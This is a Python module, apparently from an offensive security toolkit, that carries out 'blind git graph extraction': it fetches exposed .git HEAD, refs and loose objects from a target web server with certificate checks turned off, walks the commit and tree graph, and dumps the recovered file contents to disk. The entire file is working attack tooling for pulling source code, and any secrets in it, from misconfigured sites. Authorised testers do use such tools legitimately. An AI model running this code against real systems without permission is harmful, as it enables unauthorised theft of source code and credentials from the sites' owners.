"""Module: Blind Git Graph Extraction - Reconstruct git objects from exposed .git paths."""

from __future__ import annotations

import asyncio
import re
import zlib
from dataclasses import dataclass, field
from pathlib import Path

import aiohttp

WORKSPACE_DIR = Path("/tmp/gcedd_workspace")

# Git object types
GIT_OBJECT_COMMIT = b"commit"
GIT_OBJECT_TREE = b"tree"
GIT_OBJECT_BLOB = b"blob"

# Regex to extract SHA-1 hashes (40 hex chars)
SHA1_PATTERN = re.compile(r"[0-9a-f]{40}")


@dataclass
class GitObject:
    """A parsed git loose object."""

    sha: str
    obj_type: str
    size: int
    content: bytes
    source_url: str

    def to_dict(self) -> dict[str, str | int]:
        return {
            "sha": self.sha,
            "type": self.obj_type,
            "size": self.size,
            "source_url": self.source_url,
        }


@dataclass
class ExtractionResult:
    """Result of a blind git extraction attempt."""

    target: str
    success: bool
    head_ref: str
    commit_sha: str
    objects_found: int
    objects: list[GitObject] = field(default_factory=list)
    files_extracted: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, str | int | bool | list[str] | list[dict[str, str | int]]]:
        return {
            "target": self.target,
            "success": self.success,
            "head_ref": self.head_ref,
            "commit_sha": self.commit_sha,
            "objects_found": self.objects_found,
            "objects": [o.to_dict() for o in self.objects],
            "files_extracted": self.files_extracted,
            "errors": self.errors,
        }


async def _fetch_text(
    session: aiohttp.ClientSession,
    url: str,
    timeout: float = 10.0,
) -> str | None:
    """Fetch a URL and return text content, or None on failure."""
    try:
        req_timeout = aiohttp.ClientTimeout(total=timeout)
        async with session.get(url, timeout=req_timeout, ssl=False) as resp:
            if resp.status == 200:
                return await resp.text(errors="replace")
    except (aiohttp.ClientError, TimeoutError, OSError):
        pass
    return None


async def _fetch_bytes(
    session: aiohttp.ClientSession,
    url: str,
    timeout: float = 10.0,
) -> bytes | None:
    """Fetch a URL and return raw bytes, or None on failure."""
    try:
        req_timeout = aiohttp.ClientTimeout(total=timeout)
        async with session.get(url, timeout=req_timeout, ssl=False) as resp:
            if resp.status == 200:
                return await resp.read()
    except (aiohttp.ClientError, TimeoutError, OSError):
        pass
    return None


def _sha_to_object_path(sha: str) -> str:
    """Convert a SHA-1 hash to its git object path (e.g., 'a1/b2c3d...')."""
    return f"{sha[:2]}/{sha[2:]}"


def _decompress_git_object(raw: bytes) -> tuple[str, int, bytes] | None:
    """
    Decompress a git loose object and parse its header.

    Returns (object_type, size, content) or None on failure.
    """
    try:
        decompressed = zlib.decompress(raw)
    except zlib.error:
        return None

    # Git object format: "<type> <size>\0<content>"
    null_pos = decompressed.find(b"\x00")
    if null_pos == -1:
        return None

    header = decompressed[:null_pos]
    content = decompressed[null_pos + 1:]

    try:
        type_str, size_str = header.split(b" ", 1)
        obj_type = type_str.decode("ascii")
        size = int(size_str.decode("ascii"))
    except (ValueError, UnicodeDecodeError):
        return None

    return obj_type, size, content


def _extract_shas_from_tree(content: bytes) -> list[str]:
    """Extract SHA-1 references from a git tree object's binary content."""
    shas: list[str] = []
    idx = 0
    while idx < len(content):
        # Tree entry format: "<mode> <name>\0<20-byte SHA>"
        null_pos = content.find(b"\x00", idx)
        if null_pos == -1:
            break
        if null_pos + 20 > len(content):
            break
        sha_bytes = content[null_pos + 1: null_pos + 21]
        sha_hex = sha_bytes.hex()
        shas.append(sha_hex)
        idx = null_pos + 21
    return shas


def _extract_shas_from_commit(content: bytes) -> list[str]:
    """Extract SHA-1 references (tree, parent) from a commit object."""
    shas: list[str] = []
    try:
        text = content.decode("utf-8", errors="replace")
    except UnicodeDecodeError:
        return shas

    for line in text.splitlines():
        if line.startswith(("tree ", "parent ")):
            parts = line.split(" ", 1)
            if len(parts) == 2 and SHA1_PATTERN.fullmatch(parts[1].strip()):
                shas.append(parts[1].strip())
    return shas


async def _resolve_head_sha(
    session: aiohttp.ClientSession,
    base_url: str,
) -> tuple[str, str]:
    """
    Resolve the HEAD reference to a commit SHA-1.

    Tries /.git/HEAD first, then falls back to /.git/refs/heads/main and /master.

    Returns (head_ref, commit_sha) or ("", "") if not found.
    """
    git_base = f"{base_url.rstrip('/')}/.git"

    # Try HEAD first
    head_content = await _fetch_text(session, f"{git_base}/HEAD")
    if head_content and head_content.strip().startswith("ref: "):
        ref_path = head_content.strip().removeprefix("ref: ").strip()
        # Resolve the ref
        ref_content = await _fetch_text(session, f"{git_base}/{ref_path}")
        if ref_content:
            sha = ref_content.strip()
            if SHA1_PATTERN.fullmatch(sha):
                return ref_path, sha

    # Try common branch refs directly
    for branch in ["main", "master", "develop"]:
        ref_url = f"{git_base}/refs/heads/{branch}"
        ref_content = await _fetch_text(session, ref_url)
        if ref_content:
            sha = ref_content.strip()
            if SHA1_PATTERN.fullmatch(sha):
                return f"refs/heads/{branch}", sha

    # Try packed-refs
    packed = await _fetch_text(session, f"{git_base}/packed-refs")
    if packed:
        for line in packed.splitlines():
            line = line.strip()
            if line.startswith("#"):
                continue
            parts = line.split(" ", 1)
            if len(parts) == 2 and SHA1_PATTERN.fullmatch(parts[0]):
                return parts[1], parts[0]

    return "", ""


async def _fetch_and_parse_object(
    session: aiohttp.ClientSession,
    base_url: str,
    sha: str,
    workspace: Path,
) -> GitObject | None:
    """Fetch a single git loose object, decompress it, and save to workspace."""
    obj_path = _sha_to_object_path(sha)
    url = f"{base_url.rstrip('/')}/.git/objects/{obj_path}"

    raw = await _fetch_bytes(session, url)
    if raw is None:
        return None

    parsed = _decompress_git_object(raw)
    if parsed is None:
        return None

    obj_type, size, content = parsed

    # Save to workspace
    obj_dir = workspace / "objects" / sha[:2]
    obj_dir.mkdir(parents=True, exist_ok=True)
    obj_file = obj_dir / sha[2:]
    obj_file.write_bytes(content)

    return GitObject(
        sha=sha,
        obj_type=obj_type,
        size=size,
        content=content,
        source_url=url,
    )


async def extract_git_objects(
    target: str,
    workspace_dir: Path | None = None,
    max_depth: int = 5,
    max_concurrent: int = 10,
) -> ExtractionResult:
    """
    Perform blind git graph extraction on a target.

    This fetches the HEAD ref, resolves the commit SHA, then recursively
    walks the object graph to extract tree and blob objects.

    Args:
        target: Base URL of the target (e.g., "http://staging.example.com").
        workspace_dir: Directory to dump extracted objects. Defaults to /tmp/gcedd_workspace/.
        max_depth: Maximum depth to traverse the object graph.
        max_concurrent: Maximum concurrent HTTP requests.

    Returns:
        ExtractionResult with all found objects and metadata.
    """
    if workspace_dir is None:
        workspace_dir = WORKSPACE_DIR

    target_workspace = workspace_dir / target.replace("://", "_").replace("/", "_")
    target_workspace.mkdir(parents=True, exist_ok=True)

    result = ExtractionResult(
        target=target,
        success=False,
        head_ref="",
        commit_sha="",
        objects_found=0,
    )

    semaphore = asyncio.Semaphore(max_concurrent)
    connector = aiohttp.TCPConnector(limit=max_concurrent, force_close=True)

    async with aiohttp.ClientSession(connector=connector) as session:
        # Step 1: Resolve HEAD to a commit SHA
        head_ref, commit_sha = await _resolve_head_sha(session, target)
        if not commit_sha:
            result.errors.append("Could not resolve HEAD reference to a commit SHA")
            return result

        result.head_ref = head_ref
        result.commit_sha = commit_sha

        # Step 2: Walk the object graph
        visited: set[str] = set()
        queue: list[str] = [commit_sha]
        depth = 0

        while queue and depth < max_depth:
            next_queue: list[str] = []

            async def _fetch_with_semaphore(sha: str) -> GitObject | None:
                async with semaphore:
                    return await _fetch_and_parse_object(
                        session, target, sha, target_workspace
                    )

            tasks = [_fetch_with_semaphore(sha) for sha in queue if sha not in visited]
            visited.update(queue)

            objects = await asyncio.gather(*tasks)

            for obj in objects:
                if obj is None:
                    continue
                result.objects.append(obj)

                # Extract child references based on object type
                if obj.obj_type == "commit":
                    child_shas = _extract_shas_from_commit(obj.content)
                    next_queue.extend(s for s in child_shas if s not in visited)
                elif obj.obj_type == "tree":
                    child_shas = _extract_shas_from_tree(obj.content)
                    next_queue.extend(s for s in child_shas if s not in visited)
                elif obj.obj_type == "blob":
                    # Save blob content as a file
                    blob_file = target_workspace / "blobs" / f"{obj.sha}.bin"
                    blob_file.parent.mkdir(parents=True, exist_ok=True)
                    blob_file.write_bytes(obj.content)
                    result.files_extracted.append(str(blob_file))

            queue = next_queue
            depth += 1

        result.objects_found = len(result.objects)
        result.success = result.objects_found > 0

    return result
